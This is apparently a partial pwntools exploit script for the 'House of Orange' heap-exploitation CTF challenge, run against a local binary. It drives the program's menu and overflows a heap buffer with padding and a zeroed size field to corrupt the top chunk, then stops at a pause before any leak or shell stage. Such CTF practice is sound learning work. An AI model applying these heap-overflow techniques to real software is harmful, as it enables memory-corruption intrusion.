from pwn import *

context.log_level = "debug"
def build(name_len, name, price, color):
    conn.sendafter("Your choice : ", "1")
    conn.sendafter("Length of name :", str(name_len))
    conn.sendafter("Name :", name)
    conn.sendafter("Price of Orange:", str(price))
    conn.sendafter("Color of Orange:", str(color))

def see_the_house():
    conn.sendafter("Your choice : ", "2")

def upgrade(name_len, name, price, color):
    conn.sendafter("Your choice : ", "3")
    conn.sendafter("Length of name :", str(name_len))
    conn.sendafter("Name:", name)
    conn.sendafter("Price of Orange:", str(price))
    conn.sendafter("Color of Orange:", str(color))

def exploit():
    build(0x18,"A" * 0x18,u32('\xff' * 4),0xddaa)
    upgrade(0x40, "A" * 0x38 + p64(0x0), u32('\xff' * 4), 0xddaa)
    build(0x18,"A" * 0x18,u32('\xff' * 4),0xddaa)
    pause()

if __name__ == "__main__":
    if len(sys.argv) > 1:
        pass
    else:
        conn = process("./houseoforange", env={"LD_PRELOAD":"./libc.so.6"})
    exploit()
